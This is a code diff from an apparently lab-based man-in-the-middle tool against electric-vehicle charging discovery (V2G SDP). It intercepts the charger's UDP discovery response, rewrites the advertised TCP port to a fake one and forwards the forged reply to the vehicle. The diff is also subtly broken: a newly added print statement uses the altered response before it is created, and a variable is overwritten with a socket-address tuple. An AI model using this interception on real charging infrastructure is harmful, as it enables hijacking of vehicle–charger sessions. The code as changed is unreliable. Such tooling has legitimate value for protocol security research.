@@ -89,26 +89,29 @@ if __name__ == "__main__":
             udp_ev1_port = addr[1] # UDP port of ev1
             print("EV->MIM %s:%s" % (ev1_ip, udp_ev1_port))
             print("(len=%d) : %s" % (len(ev1_data), ev1_data))
-            # send udp packet to the real destination
+            
             print('Waiting for UDP message from se to ev on port %s' % (udp_ev1_port))
             # b)
             (family, socktype, proto, canonname, se1_ip) = se_addrinfo[0]
             print("MIM->SE (fw) %s:%d" % (se1_ip[0], V2G_UDP_SDP_SERVER_PORT))
             s.sendto(ev1_data, se1_ip)
             while not upd_communication_finished:
+                # c)
                 se1_data, addr = s.recvfrom(90)
                 se1_ip = addr[0] # ip of se1
                 udp_se1_port = addr[1] # UDP port of se1
                 print("SE->MIM %s:%s" % (se1_ip, udp_se1_port))
                 print("(len=%d) : %s" % (len(se1_data), hexlify(se1_data)))
                 secc_udp_response = SECCDiscoveryRes(se1_data)
+                print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
                 # alter port
                 altered_secc_udp_response = secc_udp_response.get_altered_data(port=SECC_FAKE_PORT)
-                print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
+                
+                # d)
+                print("MIM->EV (fw) %s:%s" % (ev1_ip, udp_ev1_port))
                 ev_addrinfo = socket.getaddrinfo('%s%s' % (ev1_ip, '%mim-eth0'), udp_ev1_port, socket.AF_INET6, socket.SOCK_DGRAM)
-                (family, socktype, proto, canonname, ev_sockaddr) = ev_addrinfo[0]
-                print("MIM->EV %s:%s)" % (ev_sockaddr, udp_ev1_port))
-                s.sendto(altered_secc_udp_response.data, ev_sockaddr)
+                (family, socktype, proto, canonname, ev1_ip) = ev_addrinfo[0]
+                s.sendto(altered_secc_udp_response.data, ev1_ip)
                 upd_communication_finished = True
     
     # TCP exchanges begin now
